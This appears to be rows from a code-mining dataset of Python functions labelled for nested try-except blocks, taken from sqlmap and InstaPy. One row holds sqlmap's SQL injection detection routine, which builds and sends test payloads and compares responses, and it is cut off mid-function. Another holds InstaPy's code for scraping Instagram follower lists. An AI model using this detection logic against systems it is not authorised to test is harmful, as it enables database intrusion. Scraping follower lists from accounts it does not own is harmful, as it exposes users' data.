        if (getDaysFromLastUpdate() or 0) > LAST_UPDATE_NAGGING_DAYS:
            warnMsg = ""your sqlmap version is outdated""
            logger.warning(warnMsg)

        if conf.get(""showTime""):
            dataToStdout(""\n[*] ending @ %s\n\n"" % time.strftime(""%X /%Y-%m-%d/""), forceOutput=True)

        kb.threadException = True

        if kb.get(""tempDir""):
            for prefix in (MKSTEMP_PREFIX.IPC, MKSTEMP_PREFIX.TESTING, MKSTEMP_PREFIX.COOKIE_JAR, MKSTEMP_PREFIX.BIG_ARRAY):
                for filepath in glob.glob(os.path.join(kb.tempDir, ""%s*"" % prefix)):
                    try:
                        os.remove(filepath)
                    except OSError:
                        pass

            if not filterNone(filepath for filepath in glob.glob(os.path.join(kb.tempDir, '*')) if not any(filepath.endswith(_) for _ in ("".lock"", "".exe"", "".so"", '_'))):  # ignore junk files
                try:
                    shutil.rmtree(kb.tempDir, ignore_errors=True)
                except OSError:
                    pass

        if conf.get(""hashDB""):
            conf.hashDB.flush(True)
            conf.hashDB.close()         # NOTE: because of PyPy

        if conf.get(""harFile""):
            try:
                with openFile(conf.harFile, ""w+b"") as f:
                    json.dump(conf.httpCollector.obtain(), fp=f, indent=4, separators=(',', ': '))
            except SqlmapBaseException as ex:
                errMsg = getSafeExString(ex)
                logger.critical(errMsg)

        if conf.get(""api""):
            conf.databaseCursor.disconnect()

        if conf.get(""dumper""):
            conf.dumper.flush()

        # short delay for thread finalization
        _ = time.time()
        while threading.active_count() > 1 and (time.time() - _) > THREAD_FINALIZATION_TIMEOUT:
            time.sleep(0.01)

        if cmdLineOptions.get(""sqlmapShell""):
            cmdLineOptions.clear()
            conf.clear()
            kb.clear()
            conf.disableBanner = True
            main()",Nested Try-Except Blocks,1
257,instapy,/home/r4ph/desenv/phd/exception-miner/projects/py/instapy/instapy/relationship_tools.py,get_followers,"def get_followers(
    browser,
    self_username,
    username,
    grab,
    relationship_data,
    live_match,
    store_locally,
    logger,
    logfolder,
    verified_only=False,
):
    """"""Get entire list of followers using graphql queries.""""""

    # Variables
    user_data = {}
    variables = {}
    all_followers = []
    sc_rolled = 0
    grab_notifier = False
    local_read_failure = False
    passed_time = ""time loop""

    if username not in relationship_data:
        relationship_data.update({username: {""all_following"": [], ""all_followers"": []}})

    grab_info = (
        'at ""full"" range' if grab == ""full"" else ""at the range of {}"".format(grab)
    )
    tense = (
        ""live""
        if (live_match is True or not relationship_data[username][""all_followers""])
        else ""fresh""
    )

    logger.info(
        ""Retrieving {} `Followers` data of {} {}"".format(tense, username, grab_info)
    )

    user_link = ""https://www.instagram.com/{}/"".format(username)
    web_address_navigator(browser, user_link)

    # Get followers count
    followers_count, _ = get_relationship_counts(browser, username, logger)

    if grab != ""full"" and grab > followers_count:
        logger.info(
            ""You have requested higher amount than existing followers count ""
            "" ~gonna grab all available""
        )
        grab = followers_count

    # Check if user's account is private and we don't follow
    following_status, _ = get_following_status(
        browser, ""profile"", self_username, username, None, logger, logfolder
    )

    is_private = is_private_profile(browser, logger, following_status == ""Following"")

    if not username == self_username and (
        is_private is None
        or (is_private is True and following_status not in [""Following"", True])
        or (following_status == ""Blocked"")
    ):
        logger.info(
            ""This user is private and we are not following. '{}':'{}'"".format(
                is_private, following_status
            )
        )
        # Changed False to all_followers[], all_followers is empty
        return all_followers

    # sets the amount of usernames to be matched in the next queries
    match = (
        None
        if live_match is True
        else 10
        if relationship_data[username][""all_followers""]
        else None
    )

    # if there has been prior graphql query, use that existing data to speed
    # up querying time
    all_prior_followers = (
        relationship_data[username][""all_followers""] if match is not None else None
    )

    graphql_endpoint = ""view-source:https://www.instagram.com/graphql/query/""
    graphql_followers = (
        graphql_endpoint + ""?query_hash=37479f2b8209594dde7facb0d904896a""
    )

    try:
        user_data[""id""] = browser.execute_script(
            ""return window.__additionalData[Object.keys(window.__additionalData)[0]].data.""
            ""graphql.user.id""
        )
    except WebDriverException:
        user_data[""id""] = browser.execute_script(
            ""return window._sharedData.entry_data.ProfilePage[0].graphql.user.id""
        )

    variables[""id""] = user_data[""id""]
    variables[""first""] = 50

    # get follower and user loop
    try:
        has_next_data = True
        filename = None
        graphql_queries = None
        query_date = None

        url = ""{}&variables={}"".format(graphql_followers, str(json.dumps(variables)))
        web_address_navigator(browser, url)

        # Get stored graphql queries data to be used
        try:
            filename = ""{}graphql_queries.json"".format(logfolder)
            query_date = datetime.today().strftime(""%d-%m-%Y"")

            if not os.path.isfile(filename):
                with interruption_handler():
                    with open(filename, ""w"") as graphql_queries_file:
                        json.dump(
                            {username: {query_date: {""sc_rolled"": 0}}},
                            graphql_queries_file,
                        )
                        graphql_queries_file.close()

            # load the existing graphql queries data
            with open(filename) as graphql_queries_file:
                graphql_queries = json.load(graphql_queries_file)
                stored_usernames = list(name for name, date in graphql_queries.items())

                if username not in stored_usernames:
                    graphql_queries[username] = {query_date: {""sc_rolled"": 0}}
                stored_query_dates = list(
                    date for date, score in graphql_queries[username].items()
                )

                if query_date not in stored_query_dates:
                    graphql_queries[username][query_date] = {""sc_rolled"": 0}
        except Exception as exc:
            logger.info(
                ""Error occurred while getting `scroll` data from ""
                ""graphql_queries.json\n{}\n"".format(str(exc).encode(""utf-8""))
            )
            local_read_failure = True

        start_time = time.time()
        highest_value = followers_count if grab == ""full"" else grab
        # fetch all user while still has data
        while has_next_data:
            try:
                pre = browser.find_element(By.TAG_NAME, ""pre"").text
            except NoSuchElementException as exc:
                logger.info(
                    ""Encountered an error to find `pre` in page!""
                    ""\t~grabbed {} usernames \n\t{}"".format(
                        len(set(all_followers)), str(exc).encode(""utf-8"")
                    )
                )
                return all_followers

            data = json.loads(pre)[""data""]

            # get followers
            page_info = data[""user""][""edge_followed_by""][""page_info""]
            edges = data[""user""][""edge_followed_by""][""edges""]
            for user in edges:
                # If verified_only is True, determine if user is verified before adding to all_followers
                if verified_only:
                    if user[""node""][""is_verified""]:
                        all_followers.append(user[""node""][""username""])
                else:
                    all_followers.append(user[""node""][""username""])

            grabbed = len(set(all_followers))

            # write & update records at Progress Tracker
            progress_tracker(grabbed, highest_value, start_time, logger)
            print(""\n"")

            finish_time = time.time()
            diff_time = finish_time - start_time
            diff_n, diff_s = (
                (diff_time / 60 / 60, ""hours"")
                if diff_time / 60 / 60 >= 1
                else (diff_time / 60, ""minutes"")
                if diff_time / 60 >= 1
                else (diff_time, ""seconds"")
            )
            diff_n = truncate_float(diff_n, 2)
            passed_time = ""{} {}"".format(diff_n, diff_s)

            if match is not None:
                matched_followers = len(set(all_followers)) - len(
                    set(all_followers) - set(all_prior_followers)
                )
                if matched_followers >= match:
                    new_followers = set(all_followers) - set(all_prior_followers)
                    all_followers = all_followers + all_prior_followers
                    logger.info(
                        ""Grabbed {} new usernames from `Followers` in {}  ""
                        ""~total of {} usernames"".format(
                            len(set(new_followers)),
                            passed_time,
                            len(set(all_followers)),
                        )
                    )
                    grab_notifier = True
                    break

            if grab != ""full"" and grabbed >= grab:
                logger.info(
                    ""Grabbed {} usernames from `Followers` as requested at {}"".format(
                        grabbed, passed_time
                    )
                )
                grab_notifier = True
                break

            has_next_data = page_info[""has_next_page""]
            if has_next_data:
                variables[""after""] = page_info[""end_cursor""]

                url = ""{}&variables={}"".format(
                    graphql_followers, str(json.dumps(variables))
                )

                web_address_navigator(browser, url)
                sc_rolled += 1

                # dump the current graphql queries data
                if local_read_failure is not True:
                    try:
                        with interruption_handler():
                            with open(filename, ""w"") as graphql_queries_file:
                                graphql_queries[username][query_date][""sc_rolled""] += 1
                                json.dump(graphql_queries, graphql_queries_file)
                    except Exception as exc:
                        logger.info(
                            ""Error occurred while writing `scroll` data to ""
                            ""graphql_queries.json\n{}\n"".format(
                                str(exc).encode(""utf-8"")
                            )
                        )

                # take breaks gradually
                if sc_rolled > 91:
                    logger.info(""Queried too much! ~ sleeping a bit :>"")
                    sleep(600)
                    sc_rolled = 0

    except BaseException as exc:
        logger.info(
            ""Unable to get `Followers` data:\n\t{}\n"".format(str(exc).encode(""utf-8""))
        )

    # remove possible duplicates
    all_followers = sorted(set(all_followers), key=lambda x: all_followers.index(x))

    if grab_notifier is False:
        logger.info(
            ""Grabbed {} usernames from `Followers` in {}"".format(
                len(all_followers), passed_time
            )
        )

    if len(all_followers) > 0:
        if (
            store_locally is True
            and relationship_data[username][""all_followers""] != all_followers
        ):
            store_followers_data(username, grab, all_followers, logger, logfolder)
        elif store_locally is True:
            logger.info(
                ""The `Followers` data is identical with the data in previous ""
                ""query  ~not storing the file again""
            )

        if grab == ""full"":
            relationship_data[username].update({""all_followers"": all_followers})

    sleep_t = sc_rolled * 6
    sleep_t = sleep_t if sleep_t < 600 else random.randint(585, 655)
    sleep_n, sleep_s = (
        (sleep_t / 60, ""minutes"") if sleep_t / 60 >= 1 else (sleep_t, ""seconds"")
    )
    sleep_n = truncate_float(sleep_n, 4)

    logger.info(
        ""Zz :[ time to take a good nap  ~sleeping {} {}"".format(sleep_n, sleep_s)
    )
    sleep(sleep_t)
    logger.info(""Yawn :] let's go!\n"")

    return all_followers",Nested Try-Except Blocks,1
258,sqlmap,/home/r4ph/desenv/exception-miner/projects/py/sqlmap/lib/controller/checks.py,checkSqlInjection,"def checkSqlInjection(place, parameter, value):
    # Store here the details about boundaries and payload used to
    # successfully inject
    injection = InjectionDict()

    # Localized thread data needed for some methods
    threadData = getCurrentThreadData()

    # Favoring non-string specific boundaries in case of digit-like parameter values
    if isDigit(value):
        kb.cache.intBoundaries = kb.cache.intBoundaries or sorted(copy.deepcopy(conf.boundaries), key=lambda boundary: any(_ in (boundary.prefix or """") or _ in (boundary.suffix or """") for _ in ('""', '\'')))
        boundaries = kb.cache.intBoundaries
    elif value.isalpha():
        kb.cache.alphaBoundaries = kb.cache.alphaBoundaries or sorted(copy.deepcopy(conf.boundaries), key=lambda boundary: not any(_ in (boundary.prefix or """") or _ in (boundary.suffix or """") for _ in ('""', '\'')))
        boundaries = kb.cache.alphaBoundaries
    else:
        boundaries = conf.boundaries

    # Set the flag for SQL injection test mode
    kb.testMode = True

    paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else place
    tests = getSortedInjectionTests()
    seenPayload = set()

    kb.data.setdefault(""randomInt"", str(randomInt(10)))
    kb.data.setdefault(""randomStr"", str(randomStr(10)))

    while tests:
        test = tests.pop(0)

        try:
            if kb.endDetection:
                break

            if conf.dbms is None:
                # If the DBMS has not yet been fingerprinted (via simple heuristic check
                # or via DBMS-specific payload) and boolean-based blind has been identified
                # then attempt to identify with a simple DBMS specific boolean-based
                # test what the DBMS may be
                if not injection.dbms and PAYLOAD.TECHNIQUE.BOOLEAN in injection.data:
                    if not Backend.getIdentifiedDbms() and kb.heuristicDbms is None and not kb.droppingRequests:
                        kb.heuristicDbms = heuristicCheckDbms(injection)

                # If the DBMS has already been fingerprinted (via DBMS-specific
                # error message, simple heuristic check or via DBMS-specific
                # payload), ask the user to limit the tests to the fingerprinted
                # DBMS

                if kb.reduceTests is None and not conf.testFilter and (intersect(Backend.getErrorParsedDBMSes(), SUPPORTED_DBMS, True) or kb.heuristicDbms or injection.dbms):
                    msg = ""it looks like the back-end DBMS is '%s'. "" % (Format.getErrorParsedDBMSes() or kb.heuristicDbms or joinValue(injection.dbms, '/'))
                    msg += ""Do you want to skip test payloads specific for other DBMSes? [Y/n]""
                    kb.reduceTests = (Backend.getErrorParsedDBMSes() or [kb.heuristicDbms]) if readInput(msg, default='Y', boolean=True) else []

            # If the DBMS has been fingerprinted (via DBMS-specific error
            # message, via simple heuristic check or via DBMS-specific
            # payload), ask the user to extend the tests to all DBMS-specific,
            # regardless of --level and --risk values provided
            if kb.extendTests is None and not conf.testFilter and (conf.level < 5 or conf.risk < 3) and (intersect(Backend.getErrorParsedDBMSes(), SUPPORTED_DBMS, True) or kb.heuristicDbms or injection.dbms):
                msg = ""for the remaining tests, do you want to include all tests ""
                msg += ""for '%s' extending provided "" % (Format.getErrorParsedDBMSes() or kb.heuristicDbms or joinValue(injection.dbms, '/'))
                msg += ""level (%d)"" % conf.level if conf.level < 5 else """"
                msg += "" and "" if conf.level < 5 and conf.risk < 3 else """"
                msg += ""risk (%d)"" % conf.risk if conf.risk < 3 else """"
                msg += "" values? [Y/n]"" if conf.level < 5 and conf.risk < 3 else "" value? [Y/n]""
                kb.extendTests = (Backend.getErrorParsedDBMSes() or [kb.heuristicDbms]) if readInput(msg, default='Y', boolean=True) else []

            title = test.title
            kb.testType = stype = test.stype
            clause = test.clause
            unionExtended = False
            trueCode, falseCode = None, None

            if conf.httpCollector is not None:
                conf.httpCollector.setExtendedArguments({
                    ""_title"": title,
                    ""_place"": place,
                    ""_parameter"": parameter,
                })

            if stype == PAYLOAD.TECHNIQUE.UNION:
                configUnion(test.request.char)

                if ""[CHAR]"" in title:
                    if conf.uChar is None:
                        continue
                    else:
                        title = title.replace(""[CHAR]"", conf.uChar)

                elif ""[RANDNUM]"" in title or ""(NULL)"" in title:
                    title = title.replace(""[RANDNUM]"", ""random number"")

                if test.request.columns == ""[COLSTART]-[COLSTOP]"":
                    if conf.uCols is None:
                        continue
                    else:
                        title = title.replace(""[COLSTART]"", str(conf.uColsStart))
                        title = title.replace(""[COLSTOP]"", str(conf.uColsStop))

                elif conf.uCols is not None:
                    debugMsg = ""skipping test '%s' because the user "" % title
                    debugMsg += ""provided custom column range %s"" % conf.uCols
                    logger.debug(debugMsg)
                    continue

                match = re.search(r""(\d+)-(\d+)"", test.request.columns)
                if match and injection.data:
                    lower, upper = int(match.group(1)), int(match.group(2))
                    for _ in (lower, upper):
                        if _ > 1:
                            __ = 2 * (_ - 1) + 1 if _ == lower else 2 * _
                            unionExtended = True
                            test.request.columns = re.sub(r""\b%d\b"" % _, str(__), test.request.columns)
                            title = re.sub(r""\b%d\b"" % _, str(__), title)
                            test.title = re.sub(r""\b%d\b"" % _, str(__), test.title)

            # Skip test if the user's wants to test only for a specific
            # technique
            if conf.technique and isinstance(conf.technique, list) and stype not in conf.technique:
                debugMsg = ""skipping test '%s' because user "" % title
                debugMsg += ""specified testing of only ""
                debugMsg += ""%s techniques"" % "" & "".join(PAYLOAD.SQLINJECTION[_] for _ in conf.technique)
                logger.debug(debugMsg)
                continue

            # Skip test if it is the same SQL injection type already
            # identified by another test
            if injection.data and stype in injection.data:
                debugMsg = ""skipping test '%s' because "" % title
                debugMsg += ""the payload for %s has "" % PAYLOAD.SQLINJECTION[stype]
                debugMsg += ""already been identified""
                logger.debug(debugMsg)
                continue

            # Parse DBMS-specific payloads' details
            if ""details"" in test and ""dbms"" in test.details:
                payloadDbms = test.details.dbms
            else:
                payloadDbms = None

            # Skip tests if title, vector or DBMS is not included by the
            # given test filter
            if conf.testFilter and not any(conf.testFilter in str(item) or re.search(conf.testFilter, str(item), re.I) for item in (test.title, test.vector, payloadDbms)):
                debugMsg = ""skipping test '%s' because its "" % title
                debugMsg += ""name/vector/DBMS is not included by the given filter""
                logger.debug(debugMsg)
                continue

            # Skip tests if title, vector or DBMS is included by the
            # given skip filter
            if conf.testSkip and any(conf.testSkip in str(item) or re.search(conf.testSkip, str(item), re.I) for item in (test.title, test.vector, payloadDbms)):
                debugMsg = ""skipping test '%s' because its "" % title
                debugMsg += ""name/vector/DBMS is included by the given skip filter""
                logger.debug(debugMsg)
                continue

            if payloadDbms is not None:
                # Skip DBMS-specific test if it does not match the user's
                # provided DBMS
                if conf.dbms and not intersect(payloadDbms, conf.dbms, True):
                    debugMsg = ""skipping test '%s' because "" % title
                    debugMsg += ""its declared DBMS is different than provided""
                    logger.debug(debugMsg)
                    continue

                elif kb.dbmsFilter and not intersect(payloadDbms, kb.dbmsFilter, True):
                    debugMsg = ""skipping test '%s' because "" % title
                    debugMsg += ""its declared DBMS is different than provided""
                    logger.debug(debugMsg)
                    continue

                elif kb.reduceTests == False:
                    pass

                # Skip DBMS-specific test if it does not match the
                # previously identified DBMS (via DBMS-specific payload)
                elif injection.dbms and not intersect(payloadDbms, injection.dbms, True):
                    debugMsg = ""skipping test '%s' because "" % title
                    debugMsg += ""its declared DBMS is different than identified""
                    logger.debug(debugMsg)
                    continue

                # Skip DBMS-specific test if it does not match the
                # previously identified DBMS (via DBMS-specific error message)
                elif kb.reduceTests and not intersect(payloadDbms, kb.reduceTests, True):
                    debugMsg = ""skipping test '%s' because the heuristic "" % title
                    debugMsg += ""tests showed that the back-end DBMS ""
                    debugMsg += ""could be '%s'"" % unArrayizeValue(kb.reduceTests)
                    logger.debug(debugMsg)
                    continue

            # If the user did not decide to extend the tests to all
            # DBMS-specific or the test payloads is not specific to the
            # identified DBMS, then only test for it if both level and risk
            # are below the corrisponding configuration's level and risk
            # values
            if not conf.testFilter and not (kb.extendTests and intersect(payloadDbms, kb.extendTests, True)):
                # Skip test if the risk is higher than the provided (or default)
                # value
                if test.risk > conf.risk:
                    debugMsg = ""skipping test '%s' because the risk (%d) "" % (title, test.risk)
                    debugMsg += ""is higher than the provided (%d)"" % conf.risk
                    logger.debug(debugMsg)
                    continue

                # Skip test if the level is higher than the provided (or default)
                # value
                if test.level > conf.level:
                    debugMsg = ""skipping test '%s' because the level (%d) "" % (title, test.level)
                    debugMsg += ""is higher than the provided (%d)"" % conf.level
                    logger.debug(debugMsg)
                    continue

            # Skip test if it does not match the same SQL injection clause
            # already identified by another test
            clauseMatch = False

            for clauseTest in clause:
                if injection.clause is not None and clauseTest in injection.clause:
                    clauseMatch = True
                    break

            if clause != [0] and injection.clause and injection.clause != [0] and not clauseMatch:
                debugMsg = ""skipping test '%s' because the clauses "" % title
                debugMsg += ""differ from the clause already identified""
                logger.debug(debugMsg)
                continue

            # Skip test if the user provided custom character (for UNION-based payloads)
            if conf.uChar is not None and (""random number"" in title or ""(NULL)"" in title):
                debugMsg = ""skipping test '%s' because the user "" % title
                debugMsg += ""provided a specific character, %s"" % conf.uChar
                logger.debug(debugMsg)
                continue

            if stype == PAYLOAD.TECHNIQUE.UNION:
                match = re.search(r""(\d+)-(\d+)"", test.request.columns)
                if match and not injection.data:
                    _ = test.request.columns.split('-')[-1]
                    if conf.uCols is None and _.isdigit():
                        if kb.futileUnion is None:
                            msg = ""it is recommended to perform ""
                            msg += ""only basic UNION tests if there is not ""
                            msg += ""at least one other (potential) ""
                            msg += ""technique found. Do you want to reduce ""
                            msg += ""the number of requests? [Y/n] ""
                            kb.futileUnion = readInput(msg, default='Y', boolean=True)

                        if kb.futileUnion and int(_) > 10:
                            debugMsg = ""skipping test '%s'"" % title
                            logger.debug(debugMsg)
                            continue

            infoMsg = ""testing '%s'"" % title
            logger.info(infoMsg)

            # Force back-end DBMS according to the current test DBMS value
            # for proper payload unescaping
            Backend.forceDbms(payloadDbms[0] if isinstance(payloadDbms, list) else payloadDbms)

            # Parse test's <request>
            comment = agent.getComment(test.request) if len(conf.boundaries) > 1 else None
            fstPayload = agent.cleanupPayload(test.request.payload, origValue=value if place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) and BOUNDED_INJECTION_MARKER not in (value or """") else None)

            for boundary in boundaries:
                injectable = False

                # Skip boundary if the level is higher than the provided (or
                # default) value
                # Parse boundary's <level>
                if boundary.level > conf.level and not (kb.extendTests and intersect(payloadDbms, kb.extendTests, True)):
                    continue

                # Skip boundary if it does not match against test's <clause>
                # Parse test's <clause> and boundary's <clause>
                clauseMatch = False

                for clauseTest in test.clause:
                    if clauseTest in boundary.clause:
                        clauseMatch = True
                        break

                if test.clause != [0] and boundary.clause != [0] and not clauseMatch:
                    continue

                # Skip boundary if it does not match against test's <where>
                # Parse test's <where> and boundary's <where>
                whereMatch = False

                for where in test.where:
                    if where in boundary.where:
                        whereMatch = True
                        break

                if not whereMatch:
                    continue

                # Parse boundary's <prefix>, <suffix> and <ptype>
                prefix = boundary.prefix or """"
                suffix = boundary.suffix or """"
                ptype = boundary.ptype

                # Options --prefix/--suffix have a higher priority (if set by user)
                prefix = conf.prefix if conf.prefix is not None else prefix
                suffix = conf.suffix if conf.suffix is not None else suffix
                comment = None if conf.suffix is not None else comment

                # If the previous injections succeeded, we know which prefix,
                # suffix and parameter type to use for further tests, no
                # need to cycle through the boundaries for the following tests
                condBound = (injection.prefix is not None and injection.suffix is not None)
                condBound &= (injection.prefix != prefix or injection.suffix != suffix)
                condType = injection.ptype is not None and injection.ptype != ptype

                # If the payload is an inline query test for it regardless
                # of previously identified injection types
                if stype != PAYLOAD.TECHNIQUE.QUERY and (condBound or condType):
                    continue

                # For each test's <where>
                for where in test.where:
                    templatePayload = None
                    vector = None

                    origValue = value
                    if kb.customInjectionMark in origValue:
                        origValue = origValue.split(kb.customInjectionMark)[0]
                        origValue = re.search(r""(\w*)\Z"", origValue).group(1)

                    # Treat the parameter original value according to the
                    # test's <where> tag
                    if where == PAYLOAD.WHERE.ORIGINAL or conf.prefix:
                        if kb.tamperFunctions:
                            templatePayload = agent.payload(place, parameter, value="""", newValue=origValue, where=where)
                    elif where == PAYLOAD.WHERE.NEGATIVE:
                        # Use different page template than the original
                        # one as we are changing parameters value, which
                        # will likely result in a different content

                        if conf.invalidLogical:
                            _ = int(kb.data.randomInt[:2])
                            origValue = ""%s AND %s LIKE %s"" % (origValue, _, _ + 1)
                        elif conf.invalidBignum:
                            origValue = kb.data.randomInt[:6]
                        elif conf.invalidString:
                            origValue = kb.data.randomStr[:6]
                        else:
                            origValue = ""-%s"" % kb.data.randomInt[:4]

                        templatePayload = agent.payload(place, parameter, value="""", newValue=origValue, where=where)
                    elif where == PAYLOAD.WHERE.REPLACE:
                        origValue = """"

                    kb.pageTemplate, kb.errorIsNone = getPageTemplate(templatePayload, place)

                    # Forge request payload by prepending with boundary's
                    # prefix and appending the boundary's suffix to the
                    # test's ' <payload><comment> ' string
                    if fstPayload:
                        boundPayload = agent.prefixQuery(fstPayload, prefix, where, clause)
                        boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)
                        reqPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)

                        if reqPayload:
                            stripPayload = re.sub(r""(\A|\b|_)([A-Za-z]{4}((?<!LIKE))|\d+)(_|\b|\Z)"", r""\g<1>.\g<4>"", reqPayload)
                            if stripPayload in seenPayload:
                                continue
                            else:
                                seenPayload.add(stripPayload)
                    else:
                        reqPayload = None

                    # Perform the test's request and check whether or not the
                    # payload was successful
                    # Parse test's <response>
                    for method, check in test.response.items():
                        check = agent.cleanupPayload(check, origValue=value if place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) and BOUNDED_INJECTION_MARKER not in (value or """") else None)

                        # In case of boolean-based blind SQL injection
                        if method == PAYLOAD.METHOD.COMPARISON:
                            # Generate payload used for comparison
                            def genCmpPayload():
                                sndPayload = agent.cleanupPayload(test.response.comparison, origValue=value if place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) and BOUNDED_INJECTION_MARKER not in (value or """") else None)

                                # Forge response payload by prepending with
                                # boundary's prefix and appending the boundary's
                                # suffix to the test's ' <payload><comment> '
                                # string
                                boundPayload = agent.prefixQuery(sndPayload, prefix, where, clause)
                                boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)
                                cmpPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)

                                return cmpPayload

                            # Useful to set kb.matchRatio at first based on False response content
                            kb.matchRatio = None
                            kb.negativeLogic = (where == PAYLOAD.WHERE.NEGATIVE)
                            suggestion = None
                            Request.queryPage(genCmpPayload(), place, raise404=False)
                            falsePage, falseHeaders, falseCode = threadData.lastComparisonPage or """", threadData.lastComparisonHeaders, threadData.lastComparisonCode
                            falseRawResponse = ""%s%s"" % (falseHeaders, falsePage)

                            # Checking if there is difference between current FALSE, original and heuristics page (i.e. not used parameter)
                            if not any((kb.negativeLogic, conf.string, conf.notString, conf.code)):
                                try:
                                    ratio = 1.0
                                    seqMatcher = getCurrentThreadData().seqMatcher

                                    for current in (kb.originalPage, kb.heuristicPage):
                                        seqMatcher.set_seq1(current or """")
                                        seqMatcher.set_seq2(falsePage or """")
                                        ratio *= seqMatcher.quick_ratio()

                                    if ratio == 1.0:
                                        continue
                                except (MemoryError, OverflowError):
                                    pass

                            # Perform the test's True request
                            trueResult = Request.queryPage(reqPayload, place, raise404=False)
                            truePage, trueHeaders, trueCode = threadData.lastComparisonPage or """", threadData.lastComparisonHeaders, threadData.lastComparisonCode
                            trueRawResponse = ""%s%s"" % (trueHeaders, truePage)

                            if trueResult and not(truePage == falsePage and not any((kb.nullConnection, conf.code))):
                                # Perform the test's False request
                                falseResult = Request.queryPage(genCmpPayload(), place, raise404=False)

                                if not falseResult:
                                    if kb.negativeLogic:
                                        boundPayload = agent.prefixQuery(kb.data.randomStr, prefix, where, clause)
                                        boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)
                                        errorPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)

                                        errorResult = Request.queryPage(errorPayload, place, raise404=False)
                                        if errorResult:
                                            continue
                                    elif kb.heuristicPage and not any((conf.string, conf.notString, conf.regexp, conf.code, kb.nullConnection)):
                                        _ = comparison(kb.heuristicPage, None, getRatioValue=True)
                                        if (_ or 0) > (kb.matchRatio or 0):
                                            kb.matchRatio = _
                                            logger.debug(""adjusting match ratio for current parameter to %.3f"" % kb.matchRatio)

                                    # Reducing false-positive ""appears"" messages in heavily dynamic environment
                                    if kb.heavilyDynamic and not Request.queryPage(reqPayload, place, raise404=False):
                                        continue

                                    injectable = True

                                elif (threadData.lastComparisonRatio or 0) > UPPER_RATIO_BOUND and not any((conf.string, conf.notString, conf.regexp, conf.code, kb.nullConnection)):
                                    originalSet = set(getFilteredPageContent(kb.pageTemplate, True, ""\n"").split(""\n""))
                                    trueSet = set(getFilteredPageContent(truePage, True, ""\n"").split(""\n""))
                                    falseSet = set(getFilteredPageContent(falsePage, True, ""\n"").split(""\n""))

                                    if threadData.lastErrorPage and threadData.lastErrorPage[1]:
                                        errorSet = set(getFilteredPageContent(threadData.lastErrorPage[1], True, ""\n"").split(""\n""))
                                    else:
                                        errorSet = set()

                                    if originalSet == trueSet != falseSet:
                                        candidates = trueSet - falseSet - errorSet

                                        if candidates:
                                            candidates = sorted(candidates, key=len)
                                            for candidate in candidates:
                                                if re.match(r""\A[\w.,! ]+\Z"", candidate) and ' ' in candidate and candidate.strip() and len(candidate) > CANDIDATE_SENTENCE_MIN_LENGTH:
                                                    suggestion = conf.string = candidate
                                                    injectable = True

                                                    infoMsg = ""%sparameter '%s' appears to be '%s' injectable (with --string=\""%s\"")"" % (""%s "" % paramType if paramType != parameter else """", parameter, title, repr(conf.string).lstrip('u').strip(""'""))
                                                    logger.info(infoMsg)

                                                    break

                            if injectable:
                                if kb.pageStable and not any((conf.string, conf.notString, conf.regexp, conf.code, kb.nullConnection)):
                                    if all((falseCode, trueCode)) and falseCode != trueCode:
                                        suggestion = conf.code = trueCode

                                        infoMsg = ""%sparameter '%s' appears to be '%s' injectable (with --code=%d)"" % (""%s "" % paramType if paramType != parameter else """", parameter, title, conf.code)
                                        logger.info(infoMsg)
                                    else:
                                        trueSet = set(extractTextTagContent(trueRawResponse))
                                        trueSet |= set(__ for _ in trueSet for __ in _.split())

                                        falseSet = set(extractTextTagContent(falseRawResponse))
                                        falseSet |= set(__ for _ in falseSet for __ in _.split())

                                        if threadData.lastErrorPage and threadData.lastErrorPage[1]:
                                            errorSet = set(extractTextTagContent(threadData.lastErrorPage[1]))
                                            errorSet |= set(__ for _ in errorSet for __ in _.split())
                                        else:
                                            errorSet = set()

                                        candidates = filterNone(_.strip() if _.strip() in trueRawResponse and _.strip() not in falseRawResponse else None for _ in (trueSet - falseSet - errorSet))

                                        if candidates:
                                            candidates = sorted(candidates, key=len)
                                            for candidate in candidates:
                                                if re.match(r""\A\w{2,}\Z"", candidate):  # Note: length of 1 (e.g. --string=5) could cause trouble, especially in error message pages with partially reflected payload content
                                                    break

                                            suggestion = conf.string = candidate

                                            infoMsg = ""%sparameter '%s' appears to be '%s' injectable (with --string=\""%s\"")"" % (""%s "" % paramType if paramType != parameter else """", parameter, title, repr(conf.string).lstrip('u').strip(""'""))
                                            logger.info(infoMsg)

                                        if not any((conf.string, conf.notString)):
                                            candidates = filterNone(_.strip() if _.strip() in falseRawResponse and _.strip() not in trueRawResponse else None for _ in (falseSet - trueSet))

                                            if candidates:
                                                candidates = sorted(candidates, key=len)
                                                for candidate in candidates:
                                                    if re.match(r""\A\w+\Z"", candidate):
                                                        break

                                                suggestion = conf.notString = candidate

                                                infoMsg = ""%sparameter '%s' appears to be '%s' injectable (with --not-string=\""%s\"")"" % (""%s "" % paramType if paramType != parameter else """", parameter, title, repr(conf.notString).lstrip('u').strip(""'""))
                                                logger.info(infoMsg)

                                if not suggestion:
                                    infoMsg = ""%sparameter '%s' appears to be '%s' injectable "" % (""%s "" % paramType if paramType != parameter else """", parameter, title)
                                    singleTimeLogMessage(infoMsg)

                        # In case of error-based SQL injection
                        elif method == PAYLOAD.METHOD.GREP:
                            # Perform the test's request and grep the response
                            # body for the test's <grep> regular expression
                            try:
                                page, headers, _ = Request.queryPage(reqPayload, place, content=True, raise404=False)
                                output = extractRegexResult(check, page, re.DOTALL | re.IGNORECASE)
                                output = output or extractRegexResult(check, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None, re.DOTALL | re.IGNORECASE)
                                output = output or extractRegexResult(check, listToStrValue((headers[key] for key in headers if key.lower() != URI_HTTP_HEADER.lower()) if headers else None), re.DOTALL | re.IGNORECASE)
                                output = output or extractRegexResult(check, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None, re.DOTALL | re.IGNORECASE)

                                if output:
                                    result = output == '1'

                                    if result:
